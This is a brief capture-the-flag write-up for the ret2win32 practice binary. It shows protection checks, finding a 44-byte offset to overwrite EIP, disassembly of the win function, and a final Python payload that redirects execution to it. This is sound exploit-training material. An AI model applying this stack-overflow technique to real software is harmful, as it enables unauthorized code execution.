# Basic Test:

## Check call system into binary file
```bash
strace ./ret2win32
```

## Check protection into binary file
```bash
checksec ./ret2win32
```

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite EIP
```bash
python2 -c 'print "A"*44 + "B"*4' | ./ret2win32
```

## See output
```bash
sudo dmesg -T
```

	[sam. avril  8 13:18:56 2023] ret2win32[31929]: segfault at 42424242 ip 0000000042424242 sp 00000000ffed7d00 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)

## Find the return address to print the flag

```bash
pwngdb> disass*ret2win
```
 
	   0x0804862c <+0>:     push   ebp
	   0x0804862d <+1>:     mov    ebp,esp
	   0x0804862f <+3>:     sub    esp,0x8
	   0x08048632 <+6>:     sub    esp,0xc
	   0x08048635 <+9>:     push   0x80487f6
	   0x0804863a <+14>:    call   0x80483d0 <puts@plt>
	   0x0804863f <+19>:    add    esp,0x10
	   0x08048642 <+22>:    sub    esp,0xc
	   0x08048645 <+25>:    push   0x8048813
	   0x0804864a <+30>:    call   0x80483e0 <system@plt>
	   0x0804864f <+35>:    add    esp,0x10
	   0x08048652 <+38>:    nop
	   0x08048653 <+39>:    leave
	   0x08048654 <+40>:    ret

## Payload final CLI

```bash
python2 -c 'print "A"*44 + "\x2c\x86\x04\x08"' | ./ret2win32 #0x0804862c
```